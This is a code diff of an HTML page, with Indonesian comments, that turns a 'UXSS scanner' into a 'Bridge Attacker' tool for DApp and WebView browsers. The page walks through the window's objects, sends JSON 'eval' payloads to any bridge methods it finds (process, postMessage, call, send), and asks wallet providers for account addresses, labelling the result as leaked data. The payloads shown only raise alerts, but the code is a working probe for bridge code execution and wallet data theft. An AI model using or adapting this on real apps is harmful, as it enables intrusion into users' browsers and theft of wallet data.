@@ -1,69 +1,67 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>DApp UXSS Scanner</title>
+    <title>DApp Bridge Hunter</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { font-family: sans-serif; padding: 20px; background: #f4f4f4; }
-        .card { background: white; padding: 15px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        #status { font-weight: bold; color: green; }
-        .detected { color: red; border: 2px solid red; padding: 10px; margin-top: 10px; }
-        iframe { width: 100%; height: 200px; border: 1px dashed red; margin-top: 20px; }
+        body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
+        .log { border-bottom: 1px solid #333; padding: 5px 0; }
+        .alert { color: #ff0000; font-weight: bold; }
+        button { background: #00ff00; color: black; border: none; padding: 10px; width: 100%; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
+    <h2>-- BRIDGE ATTACKER --</h2>
+    <button onclick="startScan()">MULAI SCAN SEKARANG</button>
+    <div id="console" style="margin-top: 20px;"></div>
 
-<div class="card">
-    <h2>DApp Scanner 🔍</h2>
-    <p>Status Halaman Utama: <span id="main-status">Aman</span></p>
-    <div id="bridge-list">Mencari Bridge...</div>
-</div>
-
-<iframe srcdoc="
-    <html>
-    <body>
-        <script>
-            function tryAttack() {
-                // Cari semua benda aneh di window
-                const keys = Object.keys(window);
-                const blacklist = ['window', 'self', 'document', 'location'];
-                
-                keys.forEach(key => {
-                    if (!blacklist.includes(key) && window[key] !== null) {
-                        parent.postMessage('Ditemukan Bridge: ' + key, '*');
-                        
-                        // Coba kirim perintah jahat ke bridge yang ditemukan
-                        try {
-                            // Ini adalah payload standar untuk ngetes UXSS
-                            const poc = JSON.stringify({
-                                type: 'eval',
-                                code: 'parent.document.getElementById(\'main-status\').innerHTML = \'TERKENA UXSS!\'; parent.document.getElementById(\'main-status\').style.color = \'red\'; alert(\'BOOM! UXSS Ditemukan pada: ' + key + '\');'
-                            });
-                            
-                            // Coba berbagai macam nama fungsi umum di Android Bridge
-                            if(window[key].process) window[key].process(poc);
-                            if(window[key].postMessage) window[key].postMessage(poc);
-                            if(window[key].call) window[key].call(poc);
-                        } catch(e) {}
-                    }
-                });
-            }
-            setInterval(tryAttack, 2000);
-        </script>
-        <p style='color:red;'>Iframe Penyerang Aktif...</p>
-    </body>
-    </html>
-"></iframe>
-
-<script>
-    // Mendengarkan laporan dari iframe
-    window.addEventListener('message', function(event) {
-        let list = document.getElementById('bridge-list');
-        if(!list.innerHTML.includes(event.data)) {
-            list.innerHTML += '<div class=\'detected\'>' + event.data + '</div>';
+    <script>
+        function print(msg, isAlert = false) {
+            const div = document.createElement('div');
+            div.className = isAlert ? 'log alert' : 'log';
+            div.innerHTML = `> ${msg}`;
+            document.getElementById('console').prepend(div);
         }
-    });
-</script>
 
+        function startScan() {
+            print("Memulai pemindaian objek window...");
+            
+            // Daftar objek standar yang kita abaikan
+            const ignore = ['window', 'self', 'document', 'location', 'top', 'frames', 'history', 'navigator'];
+
+            Object.keys(window).forEach(key => {
+                // Cari objek yang bukan bawaan browser standar
+                if (!ignore.includes(key) && window[key] !== null) {
+                    print(`Menemukan Potensi Bridge: <b>${key}</b>`);
+
+                    // 1. Coba curi info akun (Common di DApp Browser)
+                    try {
+                        if (window[key].request) {
+                            window[key].request({method: 'eth_accounts'}).then(acc => {
+                                print(`DATA BOCOR! Alamat Dompet: ${acc}`, true);
+                            });
+                        }
+                    } catch(e) {}
+
+                    // 2. Coba kirim payload UXSS (Jika ini jembatan Java Android)
+                    const pocPayload = JSON.stringify({
+                        type: 'eval',
+                        code: 'alert("VULNERABLE: Bridge ' + key + ' bisa mengeksekusi kode!")'
+                    });
+
+                    try {
+                        // Coba berbagai nama fungsi pengirim pesan
+                        const methods = ['process', 'postMessage', 'call', 'send', 'sendMessage'];
+                        methods.forEach(m => {
+                            if (typeof window[key][m] === 'function') {
+                                print(`Mencoba metode: ${key}.${m}()`);
+                                window[key][m](pocPayload);
+                            }
+                        });
+                    } catch(e) {}
+                }
+            });
+        }
+    </script>
 </body>
 </html>
